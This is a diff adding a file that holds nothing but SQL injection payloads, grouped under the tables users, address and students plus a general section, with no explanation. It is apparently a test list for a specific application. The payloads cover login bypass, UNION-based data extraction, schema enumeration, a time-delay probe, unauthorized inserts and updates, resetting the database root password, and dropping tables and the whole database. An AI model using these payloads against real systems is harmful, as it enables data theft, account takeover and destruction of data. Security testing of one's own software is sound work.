@@ -1,0 +1,28 @@
+users:
+' OR 'abc' = 'abc		
+' OR 1;-- '			
+; INSERT INTO users VALUES ('abdes','123ab');-- '
+'; UPDATE users SET upassword = 'hjghg' WHERE username = 'jin.hong';-- '
+'; ALTER TABLE users ADD COLUMN jwhfkjehwfhf int AFTER upassword;-- '
+' UNION SELECT * FROM users WHERE username LIKE '%
+
+address:
+ UNION SELECT * FROM address;-- '
+; INSERT INTO address VALUES ('123','456');-- ''
+'; UPDATE address SET address = 'hjghg' WHERE username = '123';-- '
+'; ALTER TABLE address ADD COLUMN jwhfkjehwfhf int AFTER upassword;-- '
+
+students:
+ UNION SELECT * FROM students;-- '
+; INSERT INTO students VALUES ('896','21467');-- '
+'; UPDATE students SET address = 'hjghg' WHERE username = '896';-- '
+'; ALTER TABLE students ADD COLUMN jwhfkjehwfhf int AFTER upassword;-- '
+
+general:
+ UNION SELECT SLEEP(10),1;-- '
+' UNION SELECT table_name, column_name from information_schema.columns WHERE table_schema = 'users';#
+' UNION SELECT table_name, table_type from information_schema.columns WHERE table_schema = 'users';#
+'; DROP TABLE users;#
+'; UPDATE user SET authentication_string=PASSWORD("pass") WHERE user='root';#
+'; DROP DATABASE users;#
+' UNION SELECT @@VERSION,1;# '
